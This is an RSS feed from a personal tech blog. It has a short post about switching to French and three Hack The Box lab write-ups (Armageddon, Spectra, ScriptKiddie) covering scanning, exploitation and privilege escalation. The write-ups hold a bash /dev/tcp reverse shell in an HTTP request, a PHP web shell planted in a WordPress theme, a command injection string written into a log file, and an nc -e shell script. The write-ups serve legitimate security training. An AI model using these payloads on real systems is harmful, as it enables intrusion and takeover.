<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/" version="2.0"><channel><title>Masoopy</title><link>https://www.masoopy.com/</link><description>Masoopy</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Wed, 19 Jan 2022 22:27:57 +0100</lastBuildDate><atom:link href="https://www.masoopy.com/index.xml" rel="self" type="application/rss+xml"/><item><title>Lost in Translation</title><link>https://www.masoopy.com/lost-in-translation/</link><pubDate>Wed, 19 Jan 2022 22:27:57 +0100</pubDate><dc:creator>Denis G.</dc:creator><guid>https://www.masoopy.com/lost-in-translation/</guid><description><![CDATA[<div class="featured-image">
                <img src="/images/2022/01/Lost_in_translation.png" referrerpolicy="no-referrer">
            </div><p>I have been blogging on and off for a while now. Most of the time I did it in English, which is, as you may have guessed, not my mother tongue.</p>
<h2 id="the-old-king">The old King</h2>
<p>I did so, because English is the main language for tech, and I blog about tech. This seemed like an obvious choice. However, I am about to change that. Indeed, starting now, I&rsquo;ll blog (mainly) in French. I want to get back to my &ldquo;roots&rdquo;. I feel like I have been losing touch with my mother tongue. Reading a lot in English, writing in English too, speaking Frenglish all day&hellip; I no longer know how to write well in French (even though I currently live in France).</p>
<h2 id="a-new-beginning">A new beginning</h2>
<p>So 2022, might not be <a href="https://www.zdnet.com/article/why-there-will-never-be-a-year-of-the-linux-desktop/" target="_blank" rel="noopener noreferrer">the year of the Linux desktop</a>, but hopefully it will be the year of my blog being written in French.</p>
<p>By going to the top right corner of the webpage, you can select language. For now, the French website will look empty, whereas the English version will look like an archive of the old content. This looks a bit odd at first, but actually makes senses : an old archived English project and new French one to start !</p>
<p>Small added bonus, it won&rsquo;t impact SEO for existing content!</p>
]]></description></item><item><title>HTB - Armageddon without MetaSploit</title><link>https://www.masoopy.com/htb-armageddon-without-metasploit/</link><pubDate>Sat, 31 Jul 2021 00:00:00 +0000</pubDate><dc:creator>Denis G.</dc:creator><guid>https://www.masoopy.com/htb-armageddon-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
                <img src="/images/2021/07/Armageddon_Logo.png" referrerpolicy="no-referrer">
            </div><h2 id="intro">Intro</h2>
<p>During this box, we&rsquo;ll exploit an outdated version of Drupal in order to get an initial shell. This will allow me to discover user credentials on the Drupal DB. Finally, I&rsquo;ll get privesc thanks to an insecure sudo command (once again).</p>
<h2 id="target">Target</h2>
<p><a href="https://app.hackthebox.eu/machines/323" target="_blank" rel="noopener noreferrer">HTB - Armageddon</a></p>
<h2 id="recon">Recon</h2>
<p>A quick look to the box info reveals it&rsquo;s running Linux.</p>
<h2 id="enum">Enum</h2>
<p>We run our classic <code>nmap</code> scan :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">sudo nmap -sC -sV -oA scans\armageddon
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">sudo nmap -sC -sV -oA scans/nmap $attacker_ip
 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-08 08:51 CEST
Nmap scan report for $attacker_ip
Host is up (0.025s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.48 seconds
</code></pre></td></tr></table>
</div>
</div><p>The above scans confirms we are facing a Linux box with only Apache and SSH running.</p>
<p>The <code>CHANGELOG.txt</code> shows a <code>Drupal 7.56</code> version :</p>
<p></p>
<p>After a quick look on <a href="https://www.exploit-db.com/" target="_blank" rel="noopener noreferrer">exploitDB</a>, we&rsquo;ll notice that this version should be vulnerable to <code>Drupalgeddon2</code>.</p>
<p>Let&rsquo;s see!</p>
<h2 id="exploitation">Exploitation</h2>
<p>NB: I like to use searchsploit directly in my terminal, it makes it easier to show an exploit with <code>searchsploit -x relative_path</code> and <code>searchsploit -m relative_path</code> in order to mirror (eg. copy the exploit in my current directory).</p>
<p>In our case, we&rsquo;ll be using : <code>searchsploit -m php/webapps/44449.rb</code>.</p>
<h3 id="getting-initial-shell">Getting Initial Shell</h3>
<p>After firing it up, we&rsquo;ll get a shell :</p>
<p></p>
<p>From here, we can get the Drupal config inside <code>sites/default/settings.php</code> and find <code>MySQL credentials</code> :</p>
<p></p>
<p>Once, we have the creds, we can try to dump the db, with <code>mysqldump</code>, but we&rsquo;ll gt an error about a bad character (&gt;). We,then, shall upgrade our shell.</p>
<p>Let&rsquo;s fire up <code>Burp</code>, with the following request and a <code>nc listener</code> :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">POST /shell.php HTTP/1.1
Host: $attacker_ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: has_js=1
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 46

c=bash+-i+&gt;%26+/dev/tcp/10.10.14.11/443+0&gt;%261
</code></pre></td></tr></table>
</div>
</div><p>NB : In case you are wondering, I am using the <code>shell.php</code> from the exploit, and I simply copy pasted the URL in browser, captured it with Burp, and converted to POST. Then, I could run a better script.</p>
<p>Once it is done, we can dump the DB like so :</p>
<p><code>mysqldump -u drupaluser -p drupal &gt; plop.sql</code></p>
<p>We now look inside the dump and search for user&rsquo;s information :</p>
<p></p>
<p>It appears our user is called <code>brucetherealadmin</code> and it&rsquo;s hash starts with <code>$S$</code> according to <a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank" rel="noopener noreferrer">hashcat</a>, it is a Drupal 7 hash, which we can confirm it is!</p>
<p>Now to crack it :</p>
<p><code>hashcat -m 7900 arma.hash /usr/share/wordlists/rockyou.txt</code></p>
<p>After a little while, the password will be cracked :</p>
<p></p>
<h3 id="getting-users-shell">Getting User&rsquo;s Shell</h3>
<p>We can now log in via SSH as <code>brucetherealadmin</code> with the just cracked password, and grab <code>user's flag</code> :</p>
<p></p>
<h3 id="privesc">PrivEsc</h3>
<p>Now that we are in, the first thing I like to do is checking if I have <code>sudo</code>&rsquo;s rights. This might be an easy win and it is a lot quieter than running a script such as <code>LinPeas</code>.</p>
<p>Bruce can indeed run <code>sudo snap install</code> :</p>
<p></p>
<p>When I first did the box, there was nothing on <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer">GTFObins</a>, but since there is today, let&rsquo;s do it the easy way!</p>
<p>We simply modify the first line, replacing <code>id</code> command with <code>cat /root/root.txt</code>.</p>
<p>Finally, we run it like : <code>sudo snap install plop_1.0_all.snap --dangerous --devmode</code> in order to get root&rsquo;s flag:</p>
<p></p>
<h2 id="outro">Outro</h2>
<p>I remember loving the first part until user&hellip; but the last part was just horrible. I hated it ! It was actually so painful, that I didn&rsquo;t take any note on the privesc and didn&rsquo;t even planned to do the writeup&hellip; but here I am!</p>
]]></description></item><item><title>HTB - Spectra without MetaSploit</title><link>https://www.masoopy.com/htb-spectra-without-metasploit/</link><pubDate>Tue, 27 Jul 2021 00:00:00 +0000</pubDate><dc:creator>Denis G.</dc:creator><guid>https://www.masoopy.com/htb-spectra-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
                <img src="/images/2021/07/Spectra_Logo.png" referrerpolicy="no-referrer">
            </div><h2 id="intro">Intro</h2>
<p>This is an easy Linux box, where I had to get user through a forgotten &ldquo;backup&rdquo; on a dev instance, then the privesc came from an unsecured sudo command&hellip; Sounds straightforward ? Well, not that much!</p>
<h2 id="target">Target</h2>
<p><a href="https://app.hackthebox.eu/machines/317" target="_blank" rel="noopener noreferrer">HTB - Spectra</a></p>
<h2 id="recon">Recon</h2>
<p>A quick look to the box info reveals that it is a Linux&rsquo;s box, and that&rsquo;s it!</p>
<h2 id="enum">Enum</h2>
<p>We run our classic <code>nmap</code> scan :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">sudo nmap -sC -sV -oA scans\spectra
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-27 15:23 CEST
Nmap scan report for $target_ip
Host is up (0.028s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey: 
|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
80/tcp   open  http    nginx 1.17.4
|_http-server-header: nginx/1.17.4
|_http-title: Site doesn&#39;t have a title (text/html).
3306/tcp open  mysql   MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.50 seconds
</code></pre></td></tr></table>
</div>
</div><p>Only 3 ports are open : http, mysql, and SSH.</p>
<h3 id="web-enum">Web enum</h3>
<p>Since I found a website, I&rsquo;ll manually browse to it in order to have a quick look. In the mean time, I&rsquo;ll fire up a <code>gobuster</code> scan against the IP :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://spectra.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/05/27 15:27:27 Starting gobuster in directory enumeration mode
===============================================================
/main                 (Status: 301) [Size: 169] [--&gt; http://spectra.htb/main/]
/testing              (Status: 301) [Size: 169] [--&gt; http://spectra.htb/testing/]
                                                                                 
===============================================================
2021/05/27 15:31:27 Finished
===============================================================
</code></pre></td></tr></table>
</div>
</div><p>Main page shows 2 links pointing to <a href="http://spectra.htb" target="_blank" rel="noopener noreferrer">spectra.htb</a>, this means I need to modify our <code>/etc/hosts</code> file accordingly. One instance (main) is a working Wordpress, and the other one (testing) is a broken Wordpress.</p>
<p>Once this is done, I would generally run a few more <code>gobuster</code> scans in the background against those two instances and a <code>WPScan</code> on the working Wordpress :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ Â®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://spectra.htb/main/ [target.ip]
[+] Started: Thu May 27 15:29:13 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: nginx/1.17.4
 |  - X-Powered-By: PHP/5.6.40
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://spectra.htb/main/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://spectra.htb/main/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://spectra.htb/main/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://spectra.htb/main/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=5.4.2&lt;/generator&gt;
 |  - http://spectra.htb/main/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=5.4.2&lt;/generator&gt;

[+] WordPress theme in use: twentytwenty
 | Location: http://spectra.htb/main/wp-content/themes/twentytwenty/
 | Last Updated: 2021-03-09T00:00:00.000Z
 | Readme: http://spectra.htb/main/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 1.7
 | Style URL: http://spectra.htb/main/wp-content/themes/twentytwenty/style.css?ver=1.2
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://spectra.htb/main/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: &#39;Version: 1.2&#39;

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:01 &lt;===============================================================================================================&gt; (137 / 137) 100.00% Time: 00:00:01

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu May 27 15:29:22 2021
[+] Requests Done: 170
[+] Cached Requests: 5
[+] Data Sent: 43.305 KB
[+] Data Received: 357.271 KB
[+] Memory used: 203.707 MB
[+] Elapsed time: 00:00:09
</code></pre></td></tr></table>
</div>
</div><p>This scan didn&rsquo;t reveal anything useful, I also tried to brute force <code>administrator</code> user with a top 1000 passwords list from <a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener noreferrer">SecLists</a>. No luck.</p>
<p>I decided to run the <code>WPScan</code> first, while browsing manually the other (testing) instance. Pretty quickly, I figured out that <code>directory listing</code> was enabled on this instance, this means that browsing to <code>http://spectra.htb/testing/</code> instead of <code>http://spectra.htb/testing/index.php</code> gave me the full listing of files on the web root.</p>
<p>From here, I could spot a <code>wp-config.php.save</code> file that contained credentials to connect to the database.</p>
<p>I tried connecting remotely, but MySQL wouldn&rsquo;t allow me to connect from my IP.</p>
<p>Finally, I tried logging on the working Wordpress' instance as <code>administrator</code> and with the password I found, and it worked! I was in!</p>
<h2 id="exploitation">Exploitation</h2>
<h3 id="getting-initial-shell">Getting Initial Shell</h3>
<p>Once you are logged with admin priv on a Wordpress, getting a shell is, as far as I have seen, very easy! Basically, it is about editing a theme (preferably an unused one), and adding a small line of <code>PHP</code> in order to get some kind of <code>RCE</code>.</p>
<p>In this case, I edited theme <code>twentyseven</code>, file <code>404.php</code> and added the following line : <code>echo system($_REQUEST['nes']);</code></p>
<p>This means, that I can now run commands like so (directly in browser, or via Curl, Burp, etc) :</p>
<p><code>curl http://spectra.htb/main/themes/twentyseven/404.php&amp;nes=whoami</code></p>
<p>From here, I like to use Burp, convert the request to <code>POST</code> and play around or simply get a better shell.</p>
<p>On this particular box, I had several issues trying to get a proper shell.</p>
<p>I decided to upload a full php reverse shell via curl&hellip; I then reached that URL to get my reverse shell, and&hellip; I couldn&rsquo;t <a href="https://www.masoopy.com/cheatsheets/uprgrading-shells/" target="_blank" rel="noopener noreferrer">upgrade it</a>! However, I noticed that <code>nginx</code> user had a real shell inside <code>/etc/passwd</code>, so I uploaded my <code>ssh key</code> and connected as <code>nginx</code> over <code>SSH</code>!</p>
<p>From here, I ran <code>LinPeas</code> and spotted (not easily) and interesting file : <code>/etc/autologin/passwd</code></p>
<h4 id="getting-user">Getting user</h4>
<p>The password found allowed me to log in as <code>katie</code> via ssh, and allowed me to grab the <code>user flag</code> :</p>
<p></p>
<h3 id="privesc">PrivEsc</h3>
<p>Now that I have user, let&rsquo;s see if I can run sudo, and indeed I can run <code>sudo /sbin/initctl</code> without password. I headed over <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer">GTFObins</a>, but unfortunately there was nothing there.</p>
<p>After a little exploration, I noticed that I could <code>edit</code> / <code>start</code> / <code>stop</code> services in <code>/etc/init/</code>, and found a particularly interesting one called test.conf.</p>
<p></p>
<p>After more trial and errors, I simply decided to replace the <code>date</code> command by <code>cat /root/root.txt</code>, which got me the <code>root flag</code> from log file in <code>/var/log/nodetest.log</code> :</p>
<p></p>
<h2 id="outro">Outro</h2>
<p>This was another fun with quite a few unexpected hurdles. It was really cool to &ldquo;think out of the box&rdquo; and try to find (ugly) ways to overcome those issues.</p>
]]></description></item><item><title>HTB - ScriptKiddie</title><link>https://www.masoopy.com/htb-scriptkiddie/</link><pubDate>Thu, 10 Jun 2021 00:00:00 +0000</pubDate><dc:creator>Denis G.</dc:creator><guid>https://www.masoopy.com/htb-scriptkiddie/</guid><description><![CDATA[<div class="featured-image">
                <img src="/images/2021/06/SK_Logo.png" referrerpolicy="no-referrer">
            </div><h2 id="intro">Intro</h2>
<h2 id="target">Target</h2>
<p><a href="https://app.hackthebox.eu/machines/314" target="_blank" rel="noopener noreferrer">HTB - ScriptKiddie</a></p>
<h2 id="recon">Recon</h2>
<p>Initial recon tells us the box is running Linux, and that&rsquo;s about it!</p>
<h2 id="enum">Enum</h2>
<p>During the enum phase</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">sudo nmap -sC -sV -oA scans/fast $target_ip
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text"># Nmap 7.91 scan initiated Mon May 17 15:00:50 2021 as: nmap -sC -sV -oA scans/fast $target_ip
Nmap scan report for $target_ip
Host is up (0.037s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-title: k1d&#39;5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 17 15:00:58 2021 -- 1 IP address (1 host up) scanned in 8.98 second
</code></pre></td></tr></table>
</div>
</div><p>From this we discover an <code>SSH</code> service and a <code>Python webserver</code> on port 5000. It also confirms we are facing a Linux box.</p>
<p>Manually browsing to the website, we find that there are 3 tools : <code>nmap</code>, <code>searchsploit</code> anf <code>msfvenom</code>. After a few tries with <code>ffuf</code>, and <code>gobuster</code>, we couldn&rsquo;t find anything interesting.</p>
<p>However, after a quick search, <code>msfvenom</code> might be <a href="https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/" target="_blank" rel="noopener noreferrer">vulnerable</a>.</p>
<h2 id="exploitation">Exploitation</h2>
<p>Let&rsquo;s test our theory and see if we can get a shell.</p>
<h3 id="getting-initial-shell">Getting Initial Shell</h3>
<p>In order to do so, we will fire up <code>MetaSploit</code> and generate a payload (we could also <a href="https://www.exploit-db.com/exploits/49491" target="_blank" rel="noopener noreferrer">download</a> a payload and slightly modify it).</p>
<p>We then upload the payload as an Android template and before submitting it, let&rsquo;s not forget to start ar listener like so : <code>nc -nlvp 9001</code> (or your usual port). Let&rsquo;s, now, submit the request, and you should get a shell back as use kid. From here, I like to generate an ssh key and add it to the <code>.ssh/authorized_keys</code> for easier access.</p>
<p>Once this is done, I have a proper shell and way to come back easily.</p>
<p>Let&rsquo;s grab <code>user</code>&rsquo;s flag:</p>
<p></p>
<h3 id="pivoting">Pivoting</h3>
<p>Now that we are kid user, we notice that there is also a pwn user that is running a script periodically. Even more interestingly, it uses a file owned by kid as input.</p>
<p>The script in question is located at <code>/home/pwn/scanlosers.sh</code>  and looks like below:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d&#39; &#39; -f3- | sort -u | while read ip; do
    sh -c &#34;nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2&gt;&amp;1 &gt;/dev/null&#34; &amp;
done

if [[ $(wc -l &lt; $log) -gt 0 ]]; then echo -n &gt; $log; fi
</code></pre></td></tr></table>
</div>
</div><p>After a quick look at the script, we notice that it is reads the the file <code>/home/kid/logs/hackers</code>, search for the third field on the line, and run an <code>nmap</code> scan against this field.</p>
<p>Now we can trick this script into running a custom command after the <code>nmap</code>&rsquo;s one.</p>
<p>After a few trial and errors, I arrived to the following line of code :</p>
<p><code>echo &quot;1 2 127.0.0.1';/home/kid/nc.sh;date&quot; &gt; /home/kid/logs/hackers</code></p>
<p>with <code>nc.sh</code> being:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">#!/bin/bash

/home/kid/nc -lvp 9001 -e /bin/bash
</code></pre></td></tr></table>
</div>
</div><p>Don&rsquo;t forget to run a listener on port 9001, in order to grab the reverse shell. I would have wanted to do the &ldquo;ssh trick&rdquo; for easier access, but the <code>.ssh/authorized_keys</code> is owned by root&hellip; So I&rsquo;ll have to make it do with the temporary shell as <code>pwn</code>&rsquo;s user.</p>
<h3 id="privesc">PrivEsc</h3>
<p>Now that we are pwn, let&rsquo;s start by a simple <code>sudo -l</code> :</p>
<p></p>
<p>msfconsole can be run as root without password&hellip;. let&rsquo;s do it and cat the <code>root</code>&rsquo;s flag:</p>
<p></p>
<h2 id="outro">Outro</h2>
<p>This was quite a fun box, with a few extra steps for an &ldquo;easy&rdquo; machine. It also shows that hackers can be hacked! ;)</p>
